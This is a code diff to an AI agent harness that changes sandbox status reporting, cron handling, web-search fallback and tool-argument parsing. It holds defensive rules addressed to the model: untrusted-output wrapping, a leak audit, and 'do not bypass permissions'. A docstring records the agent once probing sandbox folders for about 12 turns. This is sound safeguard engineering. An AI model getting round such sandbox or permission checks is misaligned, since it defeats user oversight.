     requested = SANDBOX_BACKEND if SANDBOX_BACKEND in _SANDBOX_BACKENDS else "auto"
     if requested != "docker" and not _native_sandbox_missing_requirements():
         if _native_sandbox_ready(ARTIFACTS_ROOT):
-            return sandbox_status()
+            status = sandbox_status()
+            _report_sandbox(status)
+            return status
     if requested != "native" or _native_sandbox_broken:
         _docker_sandbox_ready(ARTIFACTS_ROOT)
-    return sandbox_status()
+    status = sandbox_status()
+    _report_sandbox(status)
+    return status
+
+
+SANDBOX_DOCKER_IMPACT = ("commands run in a container with no network; "
+                         "installs/downloads will fail")
+SANDBOX_DOCKER_NOTE = ("[note: this ran in the Docker sandbox — no network and a different "
+                       "image than the host; pip/npm installs and downloads fail here]")
+
+
+def _report_sandbox(status: dict | None = None) -> None:
+    """capabilities.SANDBOX from a sandbox_status() dict (computed if omitted).
+
+    Called where the backend is settled (startup verify, /sandbox) and where it
+    changes mid-session (a latched native or docker failure) — never per command,
+    since resolving can shell out to `docker info`."""
+    try:
+        status = status or sandbox_status()
+        resolved = status.get("resolved")
+        requested = str(status.get("requested") or "auto")
+        if resolved == "native":
+            capabilities.report(capabilities.SANDBOX, active="native", preferred="native",
+                                state=capabilities.OK)
+        elif resolved == "docker":
+            by_choice = requested == "docker"
+            reason = ("sandbox_backend=docker" if by_choice
+                      else "native sandbox failed" if _native_sandbox_broken
+                      else "native sandbox not installed")
+            capabilities.report(
+                capabilities.SANDBOX, active="docker",
+                preferred="docker" if by_choice else "native",
+                state=capabilities.OK if by_choice else capabilities.DEGRADED,
+                reason=reason, impact=SANDBOX_DOCKER_IMPACT,
+                fix="" if by_choice else "/sandbox setup (installs the native runtime)",
+                model_note=SANDBOX_DOCKER_NOTE)
+        else:
+            capabilities.report(
+                capabilities.SANDBOX, active="", preferred="native",
+                state=capabilities.UNAVAILABLE,
+                reason=(status.get("failure") or status.get("detail") or "no sandbox")[:160],
+                impact="sandboxed shell and Python commands are refused",
+                fix="/sandbox setup, or start Docker")
+    except Exception:  # noqa: BLE001 — reporting must never fail a command
+        _log.debug("sandbox capability report failed", exc_info=True)
+
+
+def _sandbox_model_note() -> str:
+    """The Docker caveat for a sandboxed command's result, or "". Reads the
+    registry only (no `docker info` per command)."""
+    entry = capabilities.get(capabilities.SANDBOX)
+    if entry is not None and entry.active == "docker":
+        return entry.model_note or SANDBOX_DOCKER_NOTE
+    return ""
 
 
 def _native_or_docker(native, docker):
@@ -7647,7 +8824,7 @@ def _exec_sandbox_argv(argv: list, timeout: int = 25) -> str:
     return _sandbox_required_error()
 
 
-DOCKER_PULL_TIMEOUT = int(APP_CONFIG.get("docker_pull_seconds", "300"))
+DOCKER_PULL_TIMEOUT = _config_int("docker_pull_seconds", 300)
 _docker_images_present = set()
 
 
@@ -7833,7 +9010,7 @@ _ARTIFACTS_CD_RE = re.compile(
     r"(?=\s*(?:&&|\|\||;|$))"
 )
 _CONTAINER_ARTIFACTS_RE = re.compile(
-    r"(?i)(?P<workspace>/workspace)[\\/]artifacts(?P<tail>[\\/]|(?=[\s\"';|&<>()]|$))"
+    r"(?i)(?<![\w./\\:~-])(?P<workspace>/workspace)[\\/]artifacts(?P<tail>[\\/]|(?=[\s\"';|&<>()]|$))"
 )
 _ARTIFACTS_PATH_RE = re.compile(
     r"(?i)(?P<prefix>^|[\s=;|&<>()])(?P<quote>[\"']?)"
@@ -7864,8 +9041,43 @@ def _artifact_workspace_command(command: str) -> str:
     )
 
 
+# "Permission denied" only in the filesystem's own wording -- Python's
+# "[Errno 13] Permission denied" or coreutils/bash's "<path>: Permission
+# denied". An API or registry saying it ({"message": "Permission denied"},
+# npm's "403 Forbidden - ... - Permission denied") is not the sandbox.
+_SANDBOX_DENIED_RE = re.compile(
+    r"Access is denied|os error (?:5|13)\b|EACCES|EPERM"
+    r"|(?:\[Errno 13\] |: )Permission denied(?! \(publickey\))")
+
+
+def _explain_sandbox_denial(result: str, workspace: Path) -> str:
+    """Say where the sandbox lets a command write when it was refused access.
+
+    "Access is denied" alone does not tell the model the boundary is deliberate,
+    so a real run spent ~12 turns probing folders for a uv cache, a venv and a
+    downloaded interpreter. Naming the boundary once ends that search.
+    """
+    if not _SANDBOX_DENIED_RE.search(result or "") or "[sandbox]" in result:
+        return result
+    return (f"{result}\n[sandbox] Shell commands may write only to {workspace} and "
+            "the sandbox temp folder; everything else is read-only, and programs "
+            "outside the agent's own runtime may be refused. Creating virtual "
+            "environments or installing packages from the shell will not work "
+            "here: keep outputs under that folder, use the packages the agent's "
+            "Python already has, or ask the user to install what is missing.")
+
+
 def _exec_sandbox_command(command: str, timeout: int = 25,
                           python_code: bool = False, image: str = "") -> str:
+    """Run in the sandbox; when Docker serves, say so in the result, so the
+    model reads a failed `pip install` as "no network here", not a bad command."""
+    result = _run_sandbox_command(command, timeout, python_code, image)
+    note = _sandbox_model_note()
+    return f"{result}\n{note}" if note and isinstance(result, str) else result
+
+
+def _run_sandbox_command(command: str, timeout: int = 25,
+                         python_code: bool = False, image: str = "") -> str:
     backend = _resolve_sandbox_backend()
     if backend == "unavailable":
         return _sandbox_required_error()
@@ -7881,28 +9093,35 @@ def _exec_sandbox_command(command: str, timeout: int = 25,
                             ".env*", "*.pem", "*.key", "*.p12", "__pycache__"))
         command = command.replace(str(ARTIFACTS_ROOT), str(workspace))
     try:
-        if backend == "native":
-            if not _native_sandbox_ready(workspace, readonly=_sandbox_readonly):
-                return (_exec_docker_command(command, timeout, python_code, image,
-                                             workspace=workspace)
-                        if _docker_usable() else _sandbox_required_error())
-            local_command = (
-                _process_display([sys.executable, "-c", command])
-                if python_code else command
-            )
-            return _native_or_docker(
-                lambda: _exec_native_sandbox(
-                    local_command, timeout, workspace, readonly=_sandbox_readonly,
-                ),
-                lambda: _exec_docker_command(
-                    command, timeout, python_code, image, workspace=workspace,
-                ),
-            )
-        return _exec_docker_command(command, timeout, python_code, image,
-                                    workspace=workspace)
+        return _explain_sandbox_denial(
+            _run_in_sandbox_backend(backend, command, timeout, python_code, image,
+                                    workspace),
+            ARTIFACTS_ROOT if temporary is None else workspace)
     finally:
         if temporary:
             temporary.cleanup()
+
+
+def _run_in_sandbox_backend(backend: str, command: str, timeout: int,
+                            python_code: bool, image: str, workspace: Path) -> str:
+    if backend == "native":
+        if not _native_sandbox_ready(workspace, readonly=_sandbox_readonly):
+            return (_exec_docker_command(command, timeout, python_code, image,
+                                         workspace=workspace)
+                    if _docker_usable() else _sandbox_required_error())
+        local_command = (
+            _python_snippet_command(command) if python_code else command
+        )
+        return _native_or_docker(
+            lambda: _exec_native_sandbox(
+                local_command, timeout, workspace, readonly=_sandbox_readonly,
+            ),
+            lambda: _exec_docker_command(
+                command, timeout, python_code, image, workspace=workspace,
+            ),
+        )
+    return _exec_docker_command(command, timeout, python_code, image,
+                                workspace=workspace)
 
 
 def install_native_sandbox() -> str:
@@ -7987,6 +9206,23 @@ def _is_missing_argument_error(result: str) -> bool:
     read it as the step having failed.
     """
     return bool(_MISSING_ARG_RE.match((result or "").lstrip()))
+
+
+def _parse_error_args(raw: str) -> dict:
+    """Arguments marking an unparseable ARGS block, with where it broke.
+
+    The position matters: a large write whose content has one unescaped quote
+    is fixable by the model only if it is told where the JSON stopped parsing.
+    """
+    args = {"__parse_error__": raw[:400]}
+    try:
+        json.loads(raw)
+    except ValueError as error:
+        pos = getattr(error, "pos", None)
+        if pos is not None:
+            args["__parse_error_at__"] = (f"{error.msg} at char {pos}, near "
+                                          f"{raw[max(0, pos - 60):pos + 20]!r}")
+    return args
 
 
 def _is_parse_error_result(result: str) -> bool:
@@ -8251,6 +9487,26 @@ def _exec_windows_cron(action: str, schedule: str = "", task: str = "",
     return "Removed."
 
 
+def _cron_entry_task(line: str, *, shell_entry: bool = True) -> str | None:
+    """Decode a managed entry without matching task substrings or shell syntax."""
+    if _CRON_MARKER not in line:
+        return None
+    parts = line.split(None, 5)
+    if len(parts) != 6:
+        return None
+    body = parts[5].rsplit(_CRON_MARKER, 1)[0].strip()
+    if not shell_entry:
+        return body
+    try:
+        words = shlex.split(body.replace(r"\%", "%"))
+    except ValueError:
+        return body  # home-local entries store task text, not a shell command
+    for index, word in enumerate(words[:-2]):
+        if word == "printf" and words[index + 1] == r"%s\n":
+            return words[index + 2]
+    return body
+
+
 def _home_crontab_path() -> Path:
     return _agent_data_dir() / "crontab"
 
@@ -8290,7 +9546,7 @@ def _exec_home_cron(action: str, schedule: str = "", task: str = "") -> str:
         return f"Scheduled: {schedule} (isolated home: {path})"
 
     if action == "remove":
-        filtered = [l for l in lines if not (_CRON_MARKER in l and task in l)]
+        filtered = [l for l in lines if _cron_entry_task(l, shell_entry=False) != task]
         if len(filtered) == len(lines):
             return "No matching entry found."
         write_entries(filtered)
@@ -8338,6 +9594,9 @@ def _exec_cron(args: dict) -> str:
                 ["crontab", "-l"], capture_output=True, text=True, timeout=20)
         except (OSError, subprocess.TimeoutExpired) as exc:
             return None, f"Cron unavailable: {exc}"
+        if result.returncode and (result.returncode != 1 or
+                result.stderr.strip() and "no crontab for" not in result.stderr.lower()):
+            return None, f"Cron unavailable: {result.stderr.strip() or 'could not read crontab'}"
         return ("" if result.returncode else result.stdout), None
 
     def write_crontab(payload):
@@ -8360,8 +9619,10 @@ def _exec_cron(args: dict) -> str:
         # approval prompt, so gated actions resolve from cron_mode instead of
         # emitting an ESCALATION_REQUEST nobody will ever see.
         entry = (f"{schedule} cd {shlex.quote(str(SHELL_CWD))} && "
-                 f"AGENT8088_UNATTENDED=1 "
-                 f"printf '%s\\n' {shlex.quote(task)} | {shlex.quote(agent)} {_CRON_MARKER}")
+                 f"printf '%s\\n' {shlex.quote(task)} | "
+                 f"AGENT8088_UNATTENDED=1 {shlex.quote(agent)} {_CRON_MARKER}")
+        # Cron parses percent signs before the shell, including quoted ones.
+        entry = entry.replace("%", r"\%")
         current, error = read_crontab()
         if error:
             return error
@@ -8372,13 +9633,12 @@ def _exec_cron(args: dict) -> str:
         return f"Scheduled: {schedule}" if result.returncode == 0 else f"Cron error: {result.stderr.strip()}"
 
     if action == "remove":
-        quoted_task = shlex.quote(task)
         current, error = read_crontab()
         if error:
             return error
         payload = "\n".join(
             line for line in current.splitlines()
-            if not (_CRON_MARKER in line and quoted_task in line)
+            if _cron_entry_task(line) != task
         )
         if payload:
             payload += "\n"
@@ -8414,24 +9674,8 @@ def schedule_task(action: str = "list", schedule: str = "", task: str = "") -> d
         if not schedule_match:
             continue
         schedule = schedule_match.group(1)
-        # Remove schedule and extract task. Unix format has "printf '%s\n' TASK | agent8088 #marker"
-        # Windows format has "SCHEDULE TASK #marker"
-        after_schedule = line[schedule_match.end():]
-        marker_idx = after_schedule.find(_CRON_MARKER)
-        if marker_idx < 0:
-            continue
-        task_part = after_schedule[:marker_idx].strip()
-        # Try to parse Unix printf format first
-        unix_match = re.search(r"printf '%s\\n'\s+(.+?)\s+\|", line)
-        if unix_match:
-            try:
-                parsed = shlex.split(unix_match.group(1))
-                scheduled_task = parsed[0] if len(parsed) == 1 else unix_match.group(1)
-            except ValueError:
-                scheduled_task = unix_match.group(1)
-        else:
-            # Fall back to Windows format: just the task text
-            scheduled_task = task_part
+        scheduled_task = _cron_entry_task(
+            line, shell_entry=sys.platform != "win32" and not _schedule_isolation_active())
         entries.append({"schedule": schedule, "task": scheduled_task})
     return {"ok": not result.startswith(("Cron unavailable", "Windows scheduler error")),
             "detail": "" if entries else result, "entries": entries}
@@ -8792,6 +10036,18 @@ def _budget_capped_timeout(timeout: int) -> int:
 
 
 def run_tool(name: str, args: dict, allow_plan: bool = True, depth: int = 0) -> str:
+    _take_blocker_note()  # a refusal audited outside run_tool must not attach here
+    result = _run_tool(name, args, allow_plan, depth)
+    if not isinstance(result, str) or result.startswith("ESCALATION_REQUEST"):
+        return result
+    # Outside any untrusted-content wrapper, so it reads as the harness speaking.
+    # Only command runners count timeouts: a file that merely contains the phrase
+    # must not.
+    runs_commands = (TOOL_SPECS.get(name) or {}).get("mode") in ("shell", "docker")
+    return result + (_take_blocker_note() or (_timeout_note(result) if runs_commands else ""))
+
+
+def _run_tool(name: str, args: dict, allow_plan: bool = True, depth: int = 0) -> str:
     global _remote_git_grant, _turn_writes
     spec = TOOL_SPECS.get(name)
     if not spec:
@@ -9180,6 +10436,9 @@ def run_tool(name: str, args: dict, allow_plan: bool = True, depth: int = 0) -> 
             _audit("tool_call", tool=name, mode=mode, decision="denied",
                    detail=query[:120], reason="outbound_secret")
             return leak
+        # Before the gate: an upgrade back to SearXNG changes which prompt
+        # rules apply, and this call should already be judged by them.
+        _maybe_reprobe_searxng()
         local_no_prompt = _local_searxng_no_prompt_enabled()
         ddgs_only = _ddgs_only_chain()
         if (not local_no_prompt and not ddgs_only
@@ -9202,26 +10461,25 @@ def run_tool(name: str, args: dict, allow_plan: bool = True, depth: int = 0) -> 
             config["web_search_provider"] = "ddgs"
             _audit("tool_call", tool=name, mode=mode, decision="allowed",
                    detail=query[:200], change_type="network_fallback")
-            return _frame_search_results(web_search.run_search(
-                query, _web_search_limit(), WEB_SEARCH_REGISTRY, config, context,
-                images=wants_images))
+            report = _run_web_search(query, config, context, wants_images)
+            _report_search_outcome(report, fallback_reason="SearXNG stopped answering")
+            return _frame_search_results(_with_search_note(report))
 
         _audit_extra = {"reason": "ddgs_no_prompt"} if ddgs_only and not local_no_prompt else {}
         _audit("tool_call", tool=name, mode=mode, decision="allowed",
                detail=query[:200], **_audit_extra)
-        if not local_no_prompt:
-            return _frame_search_results(web_search.run_search(
-                query, _web_search_limit(), WEB_SEARCH_REGISTRY, config, context,
-                images=wants_images))
-        outcome = web_search.run_search(
-            query, _web_search_limit(), WEB_SEARCH_REGISTRY, config, context,
-            return_failures=True, images=wants_images)
-        # Embedders may supply an older custom registry implementation. A plain
-        # string is still a valid result; it simply cannot request this fallback.
-        if not isinstance(outcome, tuple):
-            return _frame_search_results(outcome)
-        result, failures = outcome
-        if failures == ("searxng",):
+        # Under auto the pin is only the FIRST choice: hand run_search the rest
+        # of the auto order too, so a pin that stops answering falls through
+        # instead of failing. A call that skipped the approval gate on an
+        # exemption may only fall through to backends that exemption covers.
+        call_chain = (_search_call_chain(context, prompt_free=local_no_prompt or ddgs_only)
+                      if _search_auto_active() else None)
+        report = _run_web_search(query, config, context, wants_images, chain=call_chain)
+        _report_search_outcome(report)
+        if (local_no_prompt and not report.provider and call_chain is None
+                and report.failed == ("searxng",)):
+            # An explicit searxng pin with web_search_no_prompt=1 promised that
+            # queries stay local; leaving the network needs this query's consent.
             _audit("escalation_requested", tool=name, mode=mode,
                    decision="blocked", detail=query[:120],
                    change_type="network_fallback")
@@ -9232,7 +10490,7 @@ def run_tool(name: str, args: dict, allow_plan: bool = True, depth: int = 0) -> 
                 reason=("Local SearXNG returned no results. Retry this exact query "
                         "with public DuckDuckGo search?"),
             )
-        return _frame_search_results(result)
+        return _frame_search_results(_with_search_note(report))
 
     # --- Permission gate for writes, shell, containers, cron, and browser ---
     command = ""
@@ -9509,13 +10767,16 @@ def run_tool(name: str, args: dict, allow_plan: bool = True, depth: int = 0) -> 
         return _exec_cron(args)
 
     if mode == "docker":
-        return _exec_docker(args)
+        result = _exec_docker(args)
+        return result + _sandbox_network_note(result, str(args.get("code") or ""))
 
     if mode == "browser":
         return _exec_browser(args)
 
     if mode == "mcp":
-        return _wrap_untrusted(MCP_RUNTIME.call(name, args), f"MCP {command}")
+        mcp_result = MCP_RUNTIME.call(name, args)
+        _report_mcp()  # a call can find a server dead, or reconnect it
+        return _wrap_untrusted(mcp_result, f"MCP {command}")
 
     if mode == "read_text":
         # Documents are extracted to text first. Deliberately handled inside the
@@ -9763,7 +11024,9 @@ def run_tool(name: str, args: dict, allow_plan: bool = True, depth: int = 0) -> 
             text = testing_support.trim_output(text)
         _record_verdict(ledger_command or command, text)
         _record_localization_requirement(name, command, text)
-        return _wrap_untrusted(text, f"shell command: {_redact_secrets(command[:160])}")
+        # Host tools have the real network; only the sandbox's closed one is a setting.
+        note = "" if spec.get("host") else _sandbox_network_note(text, command)
+        return _wrap_untrusted(text, f"shell command: {_redact_secrets(command[:160])}") + note
 
     return f"Unknown tool mode '{mode}' for tool '{name}'"
 
@@ -9777,6 +11040,35 @@ def _make_diff(old: str, new: str, filename: str) -> list:
         old.splitlines(keepends=True), new.splitlines(keepends=True),
         fromfile=f"{filename} (old)", tofile=filename, lineterm="",
     ))
+
+
+# Where to get the programs tools most often shell out to, for the "not found"
+# message. Only ones with a single obvious install route are listed.
+_INSTALL_HINTS = {
+    "git": "install Git (https://git-scm.com/downloads)",
+    "rg": "install ripgrep (`brew install ripgrep`, `apt install ripgrep`, or `winget install BurntSushi.ripgrep.MSVC`)",
+    "node": "install Node.js (https://nodejs.org)",
+    "npm": "install Node.js, which includes npm (https://nodejs.org)",
+    "npx": "install Node.js, which includes npx (https://nodejs.org)",
+    "docker": "install Docker Desktop or Docker Engine (https://docs.docker.com/get-docker/)",
+}
+
+
+def _not_found_tool_error(error: FileNotFoundError) -> str:
+    """Name the missing file or program instead of "something was not found"."""
+    missing = getattr(error, "filename", None) or getattr(error, "filename2", None)
+    if not missing:
+        return efficiency.tool_error('not_found', 'The requested file or executable was not found.',
+            'Check the path or installed executable, correct the arguments, then retry.', recoverable=True)
+    program = Path(str(missing)).name
+    stem = program[:-4] if program.lower().endswith(".exe") else program
+    hint = _INSTALL_HINTS.get(stem.lower())
+    if hint or (os.sep not in str(missing) and "/" not in str(missing) and "." not in stem):
+        action = (f"`{stem}` is not installed or not on PATH: {hint}. Tell the user; do not try to install it yourself."
+                  if hint else f"`{stem}` is not installed or not on PATH. Use another tool, or tell the user it is missing.")
+        return efficiency.tool_error('not_found', f'Program not found: {stem}', action, recoverable=True)
+    return efficiency.tool_error('not_found', f'File not found: {missing}',
+        'Check the path (list the directory first), correct the arguments, then retry.', recoverable=True)
 
 
 def exec_tool(name: str, arguments: str, depth: int = 0) -> str:
@@ -9808,17 +11100,19 @@ def exec_tool(name: str, arguments: str, depth: int = 0) -> str:
     except subprocess.TimeoutExpired:
         result = efficiency.tool_error('timeout', 'Command timed out; its side effects may already have occurred.',
             'Inspect the current state before retrying. Do not repeat writes or external actions blindly.')
-    except FileNotFoundError:
-        result = efficiency.tool_error('not_found', 'The requested file or executable was not found.',
-            'Check the path or installed executable, correct the arguments, then retry.', recoverable=True)
-    except PermissionError:
-        result = efficiency.tool_error('permission_denied', 'The operating system denied access.',
+    except FileNotFoundError as e:
+        result = _not_found_tool_error(e)
+    except PermissionError as e:
+        target = f": {e.filename}" if getattr(e, "filename", None) else ""
+        result = efficiency.tool_error('permission_denied', f'The operating system denied access{target}.',
             'Ask the user to resolve access or choose an accessible path. Do not bypass permissions.')
     except (ValueError, TypeError) as e:
         result = efficiency.tool_error('invalid_input', str(e),
             'Inspect the tool schema and correct the input; do not repeat unchanged arguments.', recoverable=True)
+    except (AgentInterrupted, TurnBudgetExceeded):
+        raise  # ESC inside a tool (a sub-agent, a document run) ends the turn
     except Exception as e:
-        result = f"Error: {e}"
+        result = f"Error: {e}" if str(e) else f"Error: {type(e).__name__}"
 
     if result.startswith('Error:') and '"suggested_action"' not in result:
         validation = _is_missing_argument_error(result) or _is_parse_error_result(result)
@@ -9906,7 +11200,15 @@ def _escape_invalid_backslashes(raw: str) -> str:
                               and all(c in "0123456789abcdefABCDEF"
                                       for c in raw[index + 2:index + 6]))
             if following in '"\\/bfnrt' or unicode_escape:
-                out.append(char)
+                # Keep the pair and step over it: re-reading the escaped char
+                # would let `\"` close the string and `\\U` look invalid.
+                out.append(char + following)
+                index += 2
+                continue
+            if following == "'":
+                # JSON has no \' escape; models carry it over from Python and
+                # mean a plain quote, not a literal backslash.
+                pass
             else:
                 out.append("\\\\")
         else:
@@ -9922,9 +11224,40 @@ def _loads_tool_args(raw: str):
     so callers can distinguish "unparseable" from "no arguments given".
     """
     try:
-        return json.loads(raw)
+        parsed = json.loads(raw)
     except ValueError:
-        return json.loads(_escape_control_chars_in_strings(_escape_invalid_backslashes(raw)))
+        parsed = json.loads(_escape_control_chars_in_strings(_escape_invalid_backslashes(raw)))
+    return _unwrap_args_envelope(parsed)
+
+
+_ARGS_ENVELOPE_RE = re.compile(r"^\W*ARGS\W*?:?\s*(?=\{)")
+
+
+def _unwrap_args_envelope(parsed):
+    """Recover the real arguments a model nested inside an ✿ARGS✿ envelope.
+
+    Native-tool models that see ✿FUNCTION✿/✿ARGS✿ lines in their history copy
+    the marker into the native arguments: {"ARGS": "{...}"},
+    {"✿ARGS✿: {...}": ""} or {"": "ARGS✿: {...}"} (all observed from glm-5.3).
+    Taken literally, the tool sees no arguments and blames the model for an
+    omission it did not make.
+    """
+    if not (isinstance(parsed, dict) and len(parsed) == 1):
+        return parsed
+    key, value = next(iter(parsed.items()))
+    for text in (key, value):
+        if not isinstance(text, str):
+            continue
+        match = _ARGS_ENVELOPE_RE.match(text)
+        if not match and not (text is value and key.strip("✿: ") == "ARGS"):
+            continue
+        try:
+            inner = _loads_tool_args(text[match.end() if match else 0:])
+        except ValueError:
+            continue
+        if isinstance(inner, dict):
+            return inner
+    return parsed
 
 
 _MARKDOWN_FENCE_RE = re.compile(r"(^```[^\n]*\n.*?^```[ \t]*$)", re.MULTILINE | re.DOTALL)
@@ -10023,7 +11356,7 @@ def _args_after_function_marker(text: str, name: str):
         # An argument object was clearly intended but is broken. Same reason
         # as the ✿ARGS✿ path: flag the parse failure rather than let it look
         # like the model passed nothing.
-        return {"__parse_error__": raw_args[:400]}
+        return _parse_error_args(raw_args)
 
 
 def find_tool_calls(text: str, allowed: set = None) -> list:
@@ -10068,8 +11401,7 @@ def find_tool_calls(text: str, allowed: set = None) -> list:
                 # args here would make the tool report the argument as
                 # missing, which sends the model chasing the wrong problem.
                 # Flag the parse failure instead.
-                calls.append({"name": resolved,
-                              "arguments": {"__parse_error__": raw_args[:400]}})
+                calls.append({"name": resolved, "arguments": _parse_error_args(raw_args)})
         # An ✿ARGS✿ block that is not a JSON object matches no header above (they
         # require a '{'), and the loose-line branch below skips it because ✿ARGS✿
         # IS present — so the call was dropped and the model saw no result at
@@ -10080,7 +11412,7 @@ def find_tool_calls(text: str, allowed: set = None) -> list:
                 resolved = _resolve_tool_name(loose.group(1))
                 if resolved in allowed:
                     calls.append({"name": resolved,
-                                  "arguments": {"__parse_error__": loose.group(2).strip()[:400]}})
+                                  "arguments": _parse_error_args(loose.group(2).strip())})
         # A loose ✿FUNCTION✿ line with no ✿ARGS✿ marker. "No marker" is NOT
         # proof the model passed no arguments — it may have put them in a
         # following fence or on the next line bare, so look for the object
@@ -10369,7 +11701,7 @@ def _outbound_secret_check(payload):
 AUDIT_ENABLED = APP_CONFIG.get("audit_log", "0") == "1"
 AUDIT_LOG_PATH = Path(APP_CONFIG.get(
     "audit_log_path", str(_agent_data_dir() / "audit.jsonl"))).expanduser()
-AUDIT_MAX_DETAIL = int(APP_CONFIG.get("audit_max_detail", "512"))
+AUDIT_MAX_DETAIL = _config_int("audit_max_detail", 512)
 MODEL_TELEMETRY_ENABLED = APP_CONFIG.get("model_telemetry", "0") == "1"
 MODEL_TELEMETRY_PATH = Path(APP_CONFIG.get(
     "model_telemetry_path", str(_agent_data_dir() / "model-telemetry.jsonl"))).expanduser()
@@ -10391,7 +11723,7 @@ MEMORY_EXTRACT_MODEL = APP_CONFIG.get("memory_extract_model", "").strip()
 # remember". The extractor is the chat model unless memory_extract_model says
 # otherwise, and most current chat models reason before answering.
 MEMORY_EXTRACT_MAX_TOKENS = max(
-    256, int(APP_CONFIG.get("memory_extract_max_tokens", "4000")))
+    256, _config_int("memory_extract_max_tokens", 4000))
 
 # Embeddings resolve independently of whatever serves chat. Chat models and
 # embedding models are separate services in almost every real setup -- a 35B chat
@@ -10588,6 +11920,77 @@ def _recalled_memory_prompt(messages, system_prompt, identity=None):
     return with_memory
 
 
+# A slash command as a word of its own: not a path (/usr/local), a URL's path
+# (https://x/local) or a home path (~/local).
+_SLASH_MENTION_RE = re.compile(r"(?<![\w/:.~])/([a-z][\w-]*)(?![\w/.-])", re.IGNORECASE)
+MAX_MENTION_FACTS = 8
+_TOOL_FAMILY_FACTS = 6
+_MENTION_HEADER = ("## What the user's message refers to\n"
+                   "Facts from Agent8088's own command and tool registry. Answer from "
+                   "these; do not guess.\n")
+
+
+def _tool_fact(name: str) -> str:
+    """One line: what the tool is for and how it is called (optional args in [])."""
+    spec = TOOL_SPECS[name]
+    description = str(spec.get("description") or "").split(". ")[0].rstrip(".")
+    optional = set(spec.get("optional") or ())
+    args = ", ".join(f"[{a}]" if a in optional else a for a in spec.get("args") or ())
+    return f"- tool `{name}({args})`: {description}."
+
+
+def _mentioned_capability_facts(text: str) -> list:
+    """Registry facts for the commands and tools a message names.
+
+    Only names are taken from the message; every fact comes from a registry.
+    An unknown slash word is reported only when it is a near miss for a real
+    command (/seatch), so "what's in /etc" draws no false "no such command".
+    """
+    facts = []
+    for word in dict.fromkeys(m.lower() for m in _SLASH_MENTION_RE.findall(text or "")):
+        if word in FRONTEND_COMMANDS:
+            usage, description, details = FRONTEND_COMMANDS[word]
+            about = " ".join(part for part in (description.rstrip(".") + ".", details) if part)
+            facts.append(f"- `{usage}`: {about} (a command the user types; "
+                         "not a tool you can call)")
+        elif close := _close_commands(word, cutoff=0.75)[:1]:
+            facts.append(f"- /{word}: no such command; the user probably means "
+                         f"/{close[0]}: {FRONTEND_COMMANDS[close[0]][1]}")
+    # Words joined the way tool names are, so "cli anything" finds cli_anything_*.
+    joined = "_" + re.sub(r"[\s\-]+", "_", (text or "").lower()) + "_"
+    named = [name for name in TOOL_SPECS
+             if "_" in name and re.search(rf"(?<![a-z0-9]){re.escape(name)}(?![a-z0-9])", joined)]
+    facts.extend(_tool_fact(name) for name in named)
+    families = Counter("_".join(name.split("_")[:2]) for name in TOOL_SPECS
+                       if name.count("_") >= 2)
+    for family, size in families.items():
+        if size >= 3 and re.search(rf"(?<![a-z0-9]){re.escape(family)}(?![a-z0-9])", joined):
+            members = [n for n in TOOL_SPECS if n.startswith(family + "_") and n not in named]
+            facts.extend(_tool_fact(n) for n in members[:_TOOL_FAMILY_FACTS])
+    return facts[:MAX_MENTION_FACTS]
+
+
+def _mentioned_capabilities_prompt(messages, system_prompt):
+    """Wrap `system_prompt` with registry facts for what this turn's message names.
+
+    The same shape and boundary as _recalled_memory_prompt: built from the last
+    GENUINE user turn only, so tool output cannot inject "facts". Nothing is
+    added when nothing is named -- telling a small model everything up front
+    costs every turn and makes it worse at the task.
+    """
+    turns = _genuine_user_turns(messages)
+    facts = _mentioned_capability_facts(_message_text(turns[-1])) if turns else []
+    if not facts:
+        return system_prompt
+    addition = _MENTION_HEADER + "\n".join(facts)
+
+    def with_facts():
+        base = system_prompt() if callable(system_prompt) else system_prompt
+        return (base or current_system_prompt()) + "\n\n" + addition
+
+    return with_facts
+
+
 def _capture_turn_memory(messages, answer, *, identity=None, run_id=None,
                          source_channel="", in_background=False) -> None:
     global memory_capture_thread
@@ -10665,6 +12068,9 @@ def _audit(event: str, **fields) -> None:
     _redact_secrets, so a blocked exfiltration attempt is recorded without
     writing the credential to disk.
     """
+    # Before the AUDIT_ENABLED check: turning the log off must not turn this off.
+    if fields.get("decision") == "denied":
+        _note_config_blocker(str(fields.get("reason") or ""), str(fields.get("detail") or ""))
     if not AUDIT_ENABLED:
         return
     try:
@@ -10856,7 +12262,36 @@ def _model_error_step(turn, error) -> dict:
             "error_type": type(error).__name__, "detail": str(error)[:500]}
 
 
-def _fallback_answer(last_tool_output: str, error) -> str:
+def _model_failure_reason(error, provider_name: str = "", model_name: str = "") -> str:
+    """"I could not answer: <what broke>. <fix> Run /doctor ..." for a failed call.
+
+    The raw error stays in parentheses when it is a short plain phrase
+    ("connection reset") -- it is what a bug report needs. A JSON dump or a
+    whole HTML page (a wrong base_url) is dropped for a recognised failure: it
+    is noise to the user and is already in the model_error trace.
+    """
+    try:
+        friendly = explain_model_error(error, provider_name, model_name)
+    except Exception as exc:  # noqa: BLE001 -- explaining must never mask the failure
+        _log.debug("explain_model_error failed: %s", exc)
+        return f"I could not answer: the model backend errored ({error})."
+    from agent8088.errors import short_message
+    detail = short_message(error) if not isinstance(error, str) else " ".join(error.split())
+    message = friendly.message.rstrip()
+    if friendly.kind in ("unknown", "bad_request"):
+        # Nothing more specific to say: keep the long-standing wording.
+        message = f"the model backend errored ({detail})."
+    elif (detail and detail not in message and len(detail) <= 120
+          and not any(ch in detail for ch in "{}<>")):
+        message = f"{message.rstrip('.')} ({detail})."
+    if not message.endswith((".", "!", "?", "…", ")")):
+        message += "."
+    parts = [f"I could not answer: {message}", friendly.fix, friendly.hint]
+    return " ".join(part for part in parts if part)
+
+
+def _fallback_answer(last_tool_output: str, error, provider_name: str = "",
+                     model_name: str = "") -> str:
     """The answer to show when the model call fails after a tool has run.
 
     The tool result is the only material left, but pasting it raw made a
@@ -10866,7 +12301,7 @@ def _fallback_answer(last_tool_output: str, error) -> str:
     So: say what broke first, unwrap the envelope to the text a person can
     actually read, and label it as unsummarised source rather than an answer.
     """
-    reason = f"I could not answer: the model backend errored ({error})."
+    reason = _model_failure_reason(error, provider_name, model_name)
     body = (last_tool_output or "").strip()
     if not body:
         return reason
@@ -11023,7 +12458,7 @@ def _review_timeout(args, tool_timeout: int) -> int:
     if str(args.get("mode") or APP_CONFIG.get("open_code_review_mode", "auto")).lower() == "delegated":
         return min(tool_timeout, 30)
     try:
-        configured = int(APP_CONFIG.get("open_code_review_timeout_seconds", "1800"))
+        configured = _config_int("open_code_review_timeout_seconds", 1800)
     except ValueError:
         configured = 1800
     return max(30, min(configured, 3600))
